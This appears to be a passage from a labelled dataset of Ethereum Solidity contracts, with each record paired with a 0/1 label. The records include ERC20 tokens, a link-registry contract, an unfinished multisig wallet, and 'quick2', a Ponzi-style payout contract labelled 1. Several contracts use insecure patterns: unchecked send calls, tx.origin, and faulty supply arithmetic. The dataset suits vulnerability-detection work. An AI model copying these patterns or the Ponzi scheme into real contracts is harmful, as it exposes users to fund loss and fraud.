unitsFinal;\r\r\n        accounts[owner] -= unitsFinal;\r\r\n        accounts[msg.sender] += unitsFinal;\r\r\n        Transfer(owner, msg.sender, unitsFinal);\r\r\n        \/\/ Calculate remaining ether amount\r\r\n        uint remainEther = msg.value - (unitsFinal * marketPrice);\r\r\n        \/\/ Return extra ETH to sender\r\r\n        if (remainEther > 0) {\r\r\n            msg.sender.transfer(remainEther);\r\r\n        }\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n\r\r\n\r\r\n    function crowdsaleSetup(uint _supply, uint _perEther) public returns (bool _status) {\r\r\n        require(msg.sender == owner && accounts[owner] >= _supply * 10 ** decimals);\r\r\n        marketSupply = _supply * 10 ** decimals;\r\r\n        marketPrice = 1 ether \/ (_perEther * 10 ** decimals);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    function withdrawFunds(uint _amount) public returns (bool _status) {\r\r\n        require(msg.sender == owner && _amount > 0 && this.balance >= _amount);\r\r\n        owner.transfer(_amount);\r\r\n        return true;\r\r\n    }\r\r\n}","label":0}
{"code":"pragma solidity 0.4.11;\r\r\n\r\r\n\/**\r\r\n * Copyright 2017 Nodalblock http:\/\/nodalblock.com\r\r\n *\r\r\n * Licensed under the Apache License, Version 2.0 (the \"License\");\r\r\n * you may not use this file except in compliance with the License.\r\r\n * You may obtain a copy of the License at\r\r\n *\r\r\n *     http:\/\/www.apache.org\/licenses\/LICENSE-2.0\r\r\n *\r\r\n * Unless required by applicable law or agreed to in writing, software\r\r\n * distributed under the License is distributed on an \"AS IS\" BASIS,\r\r\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\r\r\n * See the License for the specific language governing permissions and\r\r\n * limitations under the License.\r\r\n *\/\r\r\n\r\r\n\r\r\ncontract owned {\r\r\n    address public owner;\r\r\n\r\r\n    function owned() {\r\r\n        owner = msg.sender;\r\r\n    }\r\r\n\r\r\n    modifier onlyOwner {\r\r\n        if (msg.sender != owner) throw;\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    function transferOwnership(address newOwner) onlyOwner {\r\r\n        owner = newOwner;\r\r\n    }\r\r\n}\r\r\n\r\r\nlibrary strUtils {\r\r\n    string constant NODALBLOCK_JSON_ID = &#39;\"id\":\"NODALBLOCK\"&#39;;\r\r\n    uint8 constant NODALBLOCK_JSON_MIN_LEN = 32;\r\r\n\r\r\n    function toBase58(uint256 _value, uint8 _maxLength) internal returns (string) {\r\r\n        string memory letters = \"123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ\";\r\r\n        bytes memory alphabet = bytes(letters);\r\r\n        uint8 base = 58;\r\r\n        uint8 len = 0;\r\r\n        uint256 remainder = 0;\r\r\n        bool needBreak = false;\r\r\n        bytes memory bytesReversed = bytes(new string(_maxLength));\r\r\n\r\r\n        for (uint8 i = 0; i < _maxLength; i++) {\r\r\n            if(_value < base){\r\r\n                needBreak = true;\r\r\n            }\r\r\n            remainder = _value % base;\r\r\n            _value = uint256(_value \/ base);\r\r\n            bytesReversed[i] = alphabet[remainder];\r\r\n            len++;\r\r\n            if(needBreak){\r\r\n                break;\r\r\n            }\r\r\n        }\r\r\n\r\r\n        \/\/ Reverse\r\r\n        bytes memory result = bytes(new string(len));\r\r\n        for (i = 0; i < len; i++) {\r\r\n            result[i] = bytesReversed[len - i - 1];\r\r\n        }\r\r\n        return string(result);\r\r\n    }\r\r\n\r\r\n    function concat(string _s1, string _s2) internal returns (string) {\r\r\n        bytes memory bs1 = bytes(_s1);\r\r\n        bytes memory bs2 = bytes(_s2);\r\r\n        string memory s3 = new string(bs1.length + bs2.length);\r\r\n        bytes memory bs3 = bytes(s3);\r\r\n\r\r\n        uint256 j = 0;\r\r\n        for (uint256 i = 0; i < bs1.length; i++) {\r\r\n            bs3[j++] = bs1[i];\r\r\n        }\r\r\n        for (i = 0; i < bs2.length; i++) {\r\r\n            bs3[j++] = bs2[i];\r\r\n        }\r\r\n\r\r\n        return string(bs3);\r\r\n    }\r\r\n\r\r\n\r\r\n    function isValidNodalblockJson(string _json) internal returns (bool) {\r\r\n        bytes memory json = bytes(_json);\r\r\n        bytes memory id = bytes(NODALBLOCK_JSON_ID);\r\r\n\r\r\n        if (json.length < NODALBLOCK_JSON_MIN_LEN) {\r\r\n            return false;\r\r\n        } else {\r\r\n            uint len = 0;\r\r\n            if (json[1] == id[0]) {\r\r\n                len = 1;\r\r\n                while (len < id.length && (1 + len) < json.length && json[1 + len] == id[len]) {\r\r\n                    len++;\r\r\n                }\r\r\n                if (len == id.length) {\r\r\n                    return true;\r\r\n                }\r\r\n            }\r\r\n        }\r\r\n\r\r\n        return false;\r\r\n    }\r\r\n}\r\r\n\r\r\ncontract Nodalblock is owned {\r\r\n\r\r\n    string  NODALBLOCK_URL;\r\r\n\r\r\n    \/\/ Configuration\r\r\n    mapping(string => uint256) private nodalblockConfig;\r\r\n\r\r\n    \/\/ Service accounts\r\r\n    mapping (address => bool) private srvAccount;\r\r\n\r\r\n    \/\/ Fee receiver\r\r\n    address private receiverAddress;\r\r\n\r\r\n    struct data {uint256 timestamp; string json; address sender;}\r\r\n    mapping (string => data) private nodalblock;\r\r\n\r\r\n    event nodalblockShortLink(uint256 timestamp, string code);\r\r\n\r\r\n    \/\/ Constructor\r\r\n    function Nodalblock(){\r\r\n        setConfig(\"fee\", 0);\r\r\n        setConfig(\"blockoffset\", 2000000);\r\r\n        setNodalblockURL(\"http:\/\/nodalblock.com\/\");\r\r\n    }\r\r\n\r\r\n    function setNodalblockURL(string _url) onlyOwner {\r\r\n        NODALBLOCK_URL = _url;\r\r\n    }\r\r\n\r\r\n    function getNodalblockURL() constant returns(string){\r\r\n        return NODALBLOCK_URL;\r\r\n    }\r\r\n\r\r\n    function setConfig(string _key, uint256 _value) onlyOwner {\r\r\n        nodalblockConfig[_key] = _value;\r\r\n    }\r\r\n\r\r\n    function getConfig(string _key) constant returns (uint256 _value) {\r\r\n        return nodalblockConfig[_key];\r\r\n    }\r\r\n\r\r\n    function setServiceAccount(address _address, bool _value) onlyOwner {\r\r\n        srvAccount[_address] = _value;\r\r\n    }\r\r\n    function setReceiverAddress(address _address) onlyOwner {\r\r\n        receiverAddress = _address;\r\r\n    }\r\r\n\r\r\n    function releaseFunds() onlyOwner {\r\r\n        if(!owner.send(this.balance)) throw;\r\r\n    }\r\r\n\r\r\n    function addNodalblockData(string json) {\r\r\n        checkFormat(json);\r\r\n\r\r\n        var code = generateShortLink();\r\r\n        \/\/ Checks if the record exist\r\r\n        if (getNodalblockTimestamp(code) > 0) throw;\r\r\n\r\r\n        processFee();\r\r\n        nodalblock[code] = data({\r\r\n            timestamp: block.timestamp,\r\r\n            json: json,\r\r\n            sender: tx.origin\r\r\n        });\r\r\n\r\r\n        \/\/ Fire event\r\r\n        var link = strUtils.concat(NODALBLOCK_URL, code);\r\r\n        nodalblockShortLink(block.timestamp, link);\r\r\n    }\r\r\n\r\r\n    function getNodalblockTimestamp(string code) constant returns (uint256) {\r\r\n        return nodalblock[code].timestamp;\r\r\n    }\r\r\n\r\r\n    function getNodalblockData(string code) constant returns (string) {\r\r\n        return nodalblock[code].json;\r\r\n    }\r\r\n\r\r\n    function getNodalblockSender(string code) constant returns (address) {\r\r\n        return nodalblock[code].sender;\r\r\n    }\r\r\n\r\r\n    function processFee() internal {\r\r\n        var fee = getConfig(\"fee\");\r\r\n        if (srvAccount[msg.sender] || (fee == 0)) return;\r\r\n\r\r\n        if (msg.value < fee)\r\r\n            throw;\r\r\n        else\r\r\n            if (!receiverAddress.send(fee)) throw;\r\r\n    }\r\r\n    function checkFormat(string json) internal {\r\r\n        if (!strUtils.isValidNodalblockJson(json)) throw;\r\r\n    }\r\r\n\r\r\n    function generateShortLink() internal returns (string) {\r\r\n        var s1 = strUtils.toBase58(block.number - getConfig(\"blockoffset\"), 11);\r\r\n        var s2 = strUtils.toBase58(uint256(tx.origin), 2);\r\r\n\r\r\n        var s = strUtils.concat(s1, s2);\r\r\n        return s;\r\r\n    }\r\r\n\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.4;\r\r\n\r\r\ncontract Token {\r\r\n\r\r\n    \/\/\/ @return total amount of tokens\r\r\n    function totalSupply() constant returns (uint256 supply) {}\r\r\n\r\r\n    \/\/\/ @param _owner The address from which the balance will be retrieved\r\r\n    \/\/\/ @return The balance\r\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\r\n\r\r\n    \/\/\/ @notice send `_value` token to `_to` from `msg.sender`\r\r\n    \/\/\/ @param _to The address of the recipient\r\r\n    \/\/\/ @param _value The amount of token to be transferred\r\r\n    \/\/\/ @return Whether the transfer was successful or not\r\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\r\n\r\r\n    \/\/\/ @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\r\n    \/\/\/ @param _from The address of the sender\r\r\n    \/\/\/ @param _to The address of the recipient\r\r\n    \/\/\/ @param _value The amount of token to be transferred\r\r\n    \/\/\/ @return Whether the transfer was successful or not\r\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\r\n\r\r\n    \/\/\/ @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\r\n    \/\/\/ @param _spender The address of the account able to transfer the tokens\r\r\n    \/\/\/ @param _value The amount of wei to be approved for transfer\r\r\n    \/\/\/ @return Whether the approval was successful or not\r\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\r\n\r\r\n    \/\/\/ @param _owner The address of the account owning tokens\r\r\n    \/\/\/ @param _spender The address of the account able to transfer the tokens\r\r\n    \/\/\/ @return Amount of remaining tokens allowed to spent\r\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\r\n\r\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\r\n\r\r\n}\r\r\n\r\r\ncontract StandardToken is Token {\r\r\n\r\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\r\n        \/\/Default assumes totalSupply can&#39;t be over max (2^256 - 1).\r\r\n        \/\/If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn&#39;t wrap.\r\r\n        \/\/Replace the if with this one instead.\r\r\n        \/\/if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\r\n            balances[msg.sender] -= _value;\r\r\n            balances[_to] += _value;\r\r\n            Transfer(msg.sender, _to, _value);\r\r\n            return true;\r\r\n        } else { return false; }\r\r\n    }\r\r\n\r\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\r\n        \/\/same as above. Replace this line with the following if you want to protect against wrapping uints.\r\r\n        \/\/if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\r\n            balances[_to] += _value;\r\r\n            balances[_from] -= _value;\r\r\n            allowed[_from][msg.sender] -= _value;\r\r\n            Transfer(_from, _to, _value);\r\r\n            return true;\r\r\n        } else { return false; }\r\r\n    }\r\r\n\r\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\r\n        return balances[_owner];\r\r\n    }\r\r\n\r\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\r\n        allowed[msg.sender][_spender] = _value;\r\r\n        Approval(msg.sender, _spender, _value);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\r\n      return allowed[_owner][_spender];\r\r\n    }\r\r\n\r\r\n    mapping (address => uint256) balances;\r\r\n    mapping (address => mapping (address => uint256)) allowed;\r\r\n    uint256 public totalSupply;\r\r\n}\r\r\n\r\r\ncontract DaveCoin is StandardToken { \/\/ CHANGE THIS. Update the contract name.\r\r\n\r\r\n    \/* Public variables of the token *\/\r\r\n\r\r\n    \/*\r\r\n    NOTE:\r\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\r\n    Some wallets\/interfaces might not even bother to look at this information.\r\r\n    *\/\r\r\n    string public name;                   \/\/ Token Name\r\r\n    uint8 public decimals;                \/\/ How many decimals to show. To be standard complicant keep it 18\r\r\n    string public symbol;                 \/\/ An identifier: eg SBX, XPR etc..\r\r\n    string public version = &#39;H1.0&#39;; \r\r\n    uint256 public unitsOneEthCanBuy;     \/\/ How many units of your coin can be bought by 1 ETH?\r\r\n    uint256 public totalEthInWei;         \/\/ WEI is the smallest unit of ETH (the equivalent of cent in USD or satoshi in BTC). We&#39;ll store the total ETH raised via our ICO here.  \r\r\n    address public fundsWallet;           \/\/ Where should the raised ETH go?\r\r\n\r\r\n    \/\/ This is a constructor function \r\r\n    \/\/ which means the following function name has to match the contract name declared above\r\r\n    function DaveCoin() {\r\r\n        name = \"DaveCoin\";                                   \/\/ Set the name for display purposes (CHANGE THIS)\r\r\n        decimals = 18;                                               \/\/ Amount of decimals for display purposes (CHANGE THIS)\r\r\n        symbol = \"DAVE\";                                             \/\/ Set the symbol for display purposes (CHANGE THIS)\r\r\n        unitsOneEthCanBuy = 1000;                                      \/\/ Set the price of your token for the ICO (CHANGE THIS)\r\r\n        fundsWallet = msg.sender;                                    \/\/ The owner of the contract gets ETH\r\r\n        uint256 initialSupply = 100000000;\r\r\n        balances[msg.sender] = initialSupply * uint256(decimals);               \/\/ Give the creator all initial tokens. This is set to 1000 for example. If you want your initial tokens to be X and your decimal is 5, set this value to X * 100000. (CHANGE THIS)\r\r\n        totalSupply = initialSupply* uint256(decimals);                        \/\/ Update total supply (1000 for example) (CHANGE THIS)\r\r\n    }\r\r\n\r\r\n    function() payable{\r\r\n        totalEthInWei = totalEthInWei + msg.value;\r\r\n        uint256 amount = msg.value * unitsOneEthCanBuy;\r\r\n        if (balances[fundsWallet] < amount) {\r\r\n            return;\r\r\n        }\r\r\n\r\r\n        balances[fundsWallet] = balances[fundsWallet] - amount;\r\r\n        balances[msg.sender] = balances[msg.sender] + amount;\r\r\n\r\r\n        Transfer(fundsWallet, msg.sender, amount); \/\/ Broadcast a message to the blockchain\r\r\n\r\r\n        \/\/Transfer ether to fundsWallet\r\r\n        fundsWallet.transfer(msg.value);                               \r\r\n    }\r\r\n\r\r\n    \/* Approves and then calls the receiving contract *\/\r\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\r\n        allowed[msg.sender][_spender] = _value;\r\r\n        Approval(msg.sender, _spender, _value);\r\r\n\r\r\n        \/\/call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn&#39;t have to include a contract in here just for this.\r\r\n        \/\/receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\r\n        \/\/it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\r\n        return true;\r\r\n    }\r\r\n}","label":0}
{"code":"contract quick2 {\r\r\n\r\r\n  struct Person {\r\r\n      address etherAddress;\r\r\n      uint amount;\r\r\n  }\r\r\n\r\r\n  Person[] public persons;\r\r\n\r\r\n  uint public payoutIdx = 0;\r\r\n  uint public collectedFees;\r\r\n  uint public balance = 0;\r\r\n\r\r\n  address public owner;\r\r\n\r\r\n\r\r\n  modifier onlyowner { if (msg.sender == owner) _ }\r\r\n\r\r\n\r\r\n  function quick2() {\r\r\n    owner = msg.sender;\r\r\n  }\r\r\n\r\r\n  function() {\r\r\n    enter();\r\r\n  }\r\r\n  \r\r\n  function enter() {\r\r\n    if (msg.value < 1\/100 ether) {\r\r\n        msg.sender.send(msg.value);\r\r\n        return;\r\r\n    }\r\r\n\t\r\r\n\t\tuint amount;\r\r\n\t\tif (msg.value > 20 ether) {\r\r\n\t\t\tmsg.sender.send(msg.value - 20 ether);\t\r\r\n\t\t\tamount = 20 ether;\r\r\n    }\r\r\n\t\telse {\r\r\n\t\t\tamount = msg.value;\r\r\n\t\t}\r\r\n\r\r\n\r\r\n    uint idx = persons.length;\r\r\n    persons.length += 1;\r\r\n    persons[idx].etherAddress = msg.sender;\r\r\n    persons[idx].amount = amount;\r\r\n \r\r\n    \r\r\n    if (idx != 0) {\r\r\n      collectedFees += amount \/ 10;\r\r\n\t  owner.send(collectedFees);\r\r\n\t  collectedFees = 0;\r\r\n      balance += amount - amount \/ 10;\r\r\n    } \r\r\n    else {\r\r\n      balance += amount;\r\r\n    }\r\r\n\r\r\n\r\r\n    while (balance > persons[payoutIdx].amount \/ 100 * 150) {\r\r\n      uint transactionAmount = persons[payoutIdx].amount \/ 100 * 150;\r\r\n      persons[payoutIdx].etherAddress.send(transactionAmount);\r\r\n\r\r\n      balance -= transactionAmount;\r\r\n      payoutIdx += 1;\r\r\n    }\r\r\n  }\r\r\n\r\r\n\r\r\n  function setOwner(address _owner) onlyowner {\r\r\n      owner = _owner;\r\r\n  }\r\r\n}","label":1}
{"code":"pragma solidity ^0.4.11;\r\r\n\r\r\n\r\r\n\/**\r\r\n * @title ERC20Basic\r\r\n * @dev Simpler version of ERC20 interface\r\r\n * @dev see https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n *\/\r\r\ncontract ERC20Basic {\r\r\n  uint public totalSupply;\r\r\n  function balanceOf(address who) constant returns (uint);\r\r\n  function transfer(address to, uint value);\r\r\n  event Transfer(address indexed from, address indexed to, uint value);\r\r\n}\r\r\npragma solidity ^0.4.11;\r\r\n\r\r\n\r\r\n\/**\r\r\n * Math operations with safety checks\r\r\n *\/\r\r\nlibrary SafeMath {\r\r\n  function mul(uint a, uint b) internal returns (uint) {\r\r\n    uint c = a * b;\r\r\n    assert(a == 0 || c \/ a == b);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function div(uint a, uint b) internal returns (uint) {\r\r\n    \/\/ assert(b > 0); \/\/ Solidity automatically throws when dividing by 0\r\r\n    uint c = a \/ b;\r\r\n    \/\/ assert(a == b * c + a % b); \/\/ There is no case in which this doesn&#39;t hold\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function sub(uint a, uint b) internal returns (uint) {\r\r\n    assert(b <= a);\r\r\n    return a - b;\r\r\n  }\r\r\n\r\r\n  function add(uint a, uint b) internal returns (uint) {\r\r\n    uint c = a + b;\r\r\n    assert(c >= a);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function max64(uint64 a, uint64 b) internal constant returns (uint64) {\r\r\n    return a >= b ? a : b;\r\r\n  }\r\r\n\r\r\n  function min64(uint64 a, uint64 b) internal constant returns (uint64) {\r\r\n    return a < b ? a : b;\r\r\n  }\r\r\n\r\r\n  function max256(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    return a >= b ? a : b;\r\r\n  }\r\r\n\r\r\n  function min256(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    return a < b ? a : b;\r\r\n  }\r\r\n\r\r\n  function assert(bool assertion) internal {\r\r\n    if (!assertion) {\r\r\n      revert();\r\r\n    }\r\r\n  }\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * @title Basic token\r\r\n * @dev Basic version of StandardToken, with no allowances.\r\r\n *\/\r\r\ncontract BasicToken is ERC20Basic {\r\r\n  using SafeMath for uint;\r\r\n\r\r\n  mapping(address => uint) balances;\r\r\n\r\r\n  \/**\r\r\n   * @dev Fix for the ERC20 short address attack.\r\r\n   *\/\r\r\n  modifier onlyPayloadSize(uint size) {\r\r\n     require(msg.data.length >= size + 4);\r\r\n     _;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n  * @dev transfer token for a specified address\r\r\n  * @param _to The address to transfer to.\r\r\n  * @param _value The amount to be transferred.\r\r\n  *\/\r\r\n  function transfer(address _to, uint _value) onlyPayloadSize(2 * 32) {\r\r\n    balances[msg.sender] = balances[msg.sender].sub(_value);\r\r\n    balances[_to] = balances[_to].add(_value);\r\r\n    Transfer(msg.sender, _to, _value);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n  * @dev Gets the balance of the specified address.\r\r\n  * @param _owner The address to query the the balance of.\r\r\n  * @return An uint representing the amount owned by the passed address.\r\r\n  *\/\r\r\n  function balanceOf(address _owner) constant returns (uint balance) {\r\r\n    return balances[_owner];\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\/**\r\r\n * @title ERC20 interface\r\r\n * @dev see https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n *\/\r\r\ncontract ERC20 is ERC20Basic {\r\r\n  function allowance(address owner, address spender) constant returns (uint);\r\r\n  function transferFrom(address from, address to, uint value);\r\r\n  function approve(address spender, uint value);\r\r\n  event Approval(address indexed owner, address indexed spender, uint value);\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * @title Standard ERC20 token\r\r\n *\r\r\n * @dev Implemantation of the basic standart token.\r\r\n * @dev https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n * @dev Based on code by FirstBlood: https:\/\/github.com\/Firstbloodio\/token\/blob\/master\/smart_contract\/FirstBloodToken.sol\r\r\n *\/\r\r\ncontract StandardToken is BasicToken, ERC20 {\r\r\n\r\r\n  mapping (address => mapping (address => uint)) allowed;\r\r\n\r\r\n\r\r\n  \/**\r\r\n   * @dev Transfer tokens from one address to another\r\r\n   * @param _from address The address which you want to send tokens from\r\r\n   * @param _to address The address which you want to transfer to\r\r\n   * @param _value uint the amout of tokens to be transfered\r\r\n   *\/\r\r\n  function transferFrom(address _from, address _to, uint _value) onlyPayloadSize(3 * 32) {\r\r\n    var _allowance = allowed[_from][msg.sender];\r\r\n\r\r\n    \/\/ Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\r\r\n    \/\/ if (_value > _allowance) throw;\r\r\n\r\r\n    balances[_to] = balances[_to].add(_value);\r\r\n    balances[_from] = balances[_from].sub(_value);\r\r\n    allowed[_from][msg.sender] = _allowance.sub(_value);\r\r\n    Transfer(_from, _to, _value);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * @dev Aprove the passed address to spend the specified amount of tokens on beahlf of msg.sender.\r\r\n   * @param _spender The address which will spend the funds.\r\r\n   * @param _value The amount of tokens to be spent.\r\r\n   *\/\r\r\n  function approve(address _spender, uint _value) {\r\r\n\r\r\n    \/\/ To change the approve amount you first have to reduce the addresses`\r\r\n    \/\/  allowance to zero by calling `approve(_spender, 0)` if it is not\r\r\n    \/\/  already 0 to mitigate the race condition described here:\r\r\n    \/\/  https:\/\/github.com\/ethereum\/EIPs\/issues\/20#issuecomment-263524729\r\r\n    if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) revert();\r\r\n\r\r\n    allowed[msg.sender][_spender] = _value;\r\r\n    Approval(msg.sender, _spender, _value);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * @dev Function to check the amount of tokens than an owner allowed to a spender.\r\r\n   * @param _owner address The address which owns the funds.\r\r\n   * @param _spender address The address which will spend the funds.\r\r\n   * @return A uint specifing the amount of tokens still avaible for the spender.\r\r\n   *\/\r\r\n  function allowance(address _owner, address _spender) constant returns (uint remaining) {\r\r\n    return allowed[_owner][_spender];\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\/**\r\r\n* WagaToken\u53d1\u884c\u8bf4\u660e\uff1a\r\r\n* \u5e01\u603b\u91cf\u4e3a2100\u4e07\u4e2a\u3002\u5e02\u503c\u62df\u5b9a\u4e3a100\u4e07\u3002\r\r\n* \u6839\u636ewaga\u57df\u540d\u6d88\u8d39\u91d1\u989d\uff0c\u6309\u7167\u4e00\u5b9a\u6bd4\u4f8b\u5151\u6362Token\u3002\u5f53\u5206\u914d\u603b\u91cf\u8d8b\u8fd12100\u4e07\u65f6\uff0cWagaToken\u5206\u914d\u8d8b\u5411\u4e8e0\u3002\r\r\n*\r\r\n*\/\r\r\ncontract WagaToken is StandardToken {\r\r\n\r\r\n    string public constant LOVEYOUFOREVER = \"LIANGZAI\";\r\r\n    string public constant NAME = \"WagaToken\";\r\r\n    string public constant SYMBOL = \"WGT\";\r\r\n    uint public constant DECIMALS = 18;\r\r\n\r\r\n    \/\/\/ Emitted when a function is invocated by unauthorized addresses.\r\r\n    event InvalidCaller(address caller);\r\r\n\r\r\n    \/\/\/ Emitted for each sucuessful token purchase.\r\r\n    event Issue(uint issueIndex, address addr, uint tokenAmount);\r\r\n\r\r\n    uint public issueIndex = 0;\r\r\n\r\r\n    uint constant totalAmount = 21000000;\r\r\n    \/\/\/ \u5df2\u53d1\u884c\u6570\r\r\n    uint public issueAmount = 0.0;\r\r\n\r\r\n    address owner;\r\r\n    uint currentFactor = 10 ** DECIMALS;\r\r\n\r\r\n    modifier onlyOwner {\r\r\n        if (owner == msg.sender) {\r\r\n            _;\r\r\n        } else {\r\r\n            InvalidCaller(msg.sender);\r\r\n            revert();\r\r\n        }\r\r\n    }\r\r\n\r\r\n    function WagaToken() {\r\r\n        owner = msg.sender;\r\r\n        totalSupply = 21 * 10 ** 24;\r\r\n    }\r\r\n\r\r\n    \/\/\/ @param addr \u4e3a\u53d1\u653etoken\u7684\u94b1\u5305\u5730\u5740\r\r\n    \/\/\/ @param fee \u4e3a\u8d2d\u4e70\u57df\u540d\u7684\u82b1\u8d39\r\r\n    function issueTo(address addr,uint fee) onlyOwner {\r\r\n        var tokenAmount =  21 * fee * getFactor();\r\r\n        balances[addr] = balances[addr].add(tokenAmount);\r\r\n        issueAmount = issueAmount.add(tokenAmount);\r\r\n        Issue(issueIndex++, addr, tokenAmount);\r\r\n    }\r\r\n\r\r\n\r\r\n    function getFactor() internal returns (uint) {\r\r\n        if(2 * (totalSupply - issueAmount) <= currentFactor * totalAmount) {\r\r\n            currentFactor \/= 2;\r\r\n        }\r\r\n        return currentFactor;\r\r\n    }\r\r\n\r\r\n\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.11;\r\r\n\r\r\n\r\r\n\/\/\/ @title Multisignature wallet - Allows multiple parties to agree on transactions before execution.\r\r\n\/\/\/ @author Stefan George - <<a href=\"\/cdn-cgi\/l\/email-protection\" class=\"__cf_email__\" data-cfemail=\"3241465754535c1c55575d40555772515d5c41575c414b411c5c5746\">[email&#160;protected]<\/a>>\r\r\ncontract MultiSigWallet {\r\r\n\r\r\n    uint constant public MAX_OWNER_COUNT = 50;\r\r\n\r\r\n    event Confirmation(address indexed _sender, uint indexed _transactionId);\r\r\n    event Revocation(address indexed _sender, uint indexed _transactionId);\r\r\n    event Submission(uint indexed _transactionId);\r\r\n    event Execution(uint indexed _transactionId);\r\r\n    event ExecutionFailure(uint indexed _transactionId);\r\r\n    event Deposit(address indexed _sender, uint _value);\r\r\n    event OwnerAddition(address indexed _owner);\r\r\n    event OwnerRemoval(address indexed _owner);\r\r\n    event RequirementChange(uint _required);\r\r\n\r\r\n    mapping (uint => Transaction) public transactions;\r\r\n    mapping (uint => mapping (address => bool)) public confirmations;\r\r\n    mapping (address => bool) public isOwner;\r\r\n    address[] public owners;\r\r\n    uint public required;\r\r\n    uint public transactionCount;\r\r\n\r\r\n    struct Transaction {\r\r\n        address destination;\r\r\n        uint value;\r\r\n        bytes data;\r\r\n        bool executed;\r\r\n    }\r\r\n\r\r\n    modifier onlyWallet() {\r\r\n        if (msg.sender != address(this))\r\r\n            throw;\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    modifier ownerDoesNotExist(address owner) {\r\r\n        if (isOwner[owner])\r\r\n            throw;\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    modifier ownerExists(address owner) {\r\r\n        if (!isOwner[owner])\r\r\n            throw;\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    modifier transactionExists(uint transactionId) {\r\r\n        if (transactions[transactionId].destination == 0)\r\r\n            throw;\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    modifier confirmed(uint transactionId, address owner) {\r\r\n        if (!confirmations[transactionId][owner])\r\r\n            throw;\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    modifier notConfirmed(uint transactionId, address owner) {\r\r\n        if (confirmations[transactionId][owner])\r\r\n            throw;\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    modifier notExecuted(uint transactionId) {\r\r\n        if (transactions[transactionId].executed)\r\r\n            throw;\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    modifier notNull(address _address) {\r\r\n        if (_address == 0)\r\r\n            throw;\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    modifier validRequirement(uint ownerCount, uint _required) {\r\r\n        if (   ownerCount > MAX_OWNER_COUNT\r\r\n            || _required > ownerCount\r\r\n            || _required == 0\r\r\n            || ownerCount == 0)\r\r\n            throw;\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Fallback function allows to deposit ether.\r\r\n    function()\r\r\n        payable\r\r\n    {\r\r\n        if (msg.value > 0)\r\r\n            Deposit(msg.sender, msg.value);\r\r\n    }\r\r\n\r\r\n    \/*\r\r\n     * Public functions\r\r\n     *\/\r\r\n    \/\/\/ @dev Contract constructor sets initial owners and required number of confirmations.\r\r\n    \/\/\/ @param _owners List of initial owners.\r\r\n    \/\/\/ @param _required Number of required confirmations.\r\r\n    function MultiSigWallet(address[] _owners, uint _required)\r\r\n        public\r\r\n        validRequirement(_owners.length, _required)\r\r\n    {\r\r\n        for (uint i=0; i<_owners.length; i++) {\r\r\n            if (isOwner[_owners[i]] || _owners[i] == 0)\r\r\n                throw;\r\r\n            isOwner[_owners[i]] = true;\r\r\n        }\r\r\n        owners = _owners;\r\r\n        required = _required;\r\r\n    